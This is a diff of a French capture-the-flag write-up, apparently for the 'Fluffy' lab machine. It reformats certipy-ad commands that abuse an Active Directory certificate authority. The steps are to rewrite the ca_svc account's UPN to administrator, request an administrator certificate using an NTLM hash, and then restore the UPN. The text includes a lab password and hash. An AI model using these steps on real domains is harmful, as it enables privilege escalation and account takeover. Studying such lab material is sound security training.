@@ -35,8 +35,7 @@ certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -u
 
 2. Il convient ensuite de demander un certificat en tant qu'utilisateur ca_svc. L'UPN de cet utilisateur ayant été mis à jour en « administrateur », le certificat obtenu permettra de s'authentifier en tant qu'administrateur. Notez que le modèle « Utilisateur » (modèle par défaut de l'autorité de certification) est utilisé ici.
 ```bash
-certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69'
--target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
 <SNIP>
 [*] Successfully requested certificate
 [*] Got certificate with UPN 'administrator'
@@ -47,8 +46,7 @@ certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.1
 ```
 3. Cela enregistrera le certificat de l'utilisateur Administrateur dans le fichier administrator.pfx. Avant d'utiliser ce certificat, l'UPN modifié de l'utilisateur ca_svc doit être mis à jour avec la valeur correcte.
 ```bash
-certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user
-ca_svc -upn 'ca_svc@fluffy.htb'
+certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
 <SNIP>
 [*] Updating user 'ca_svc':
  userPrincipalName : ca_svc@fluffy.htb
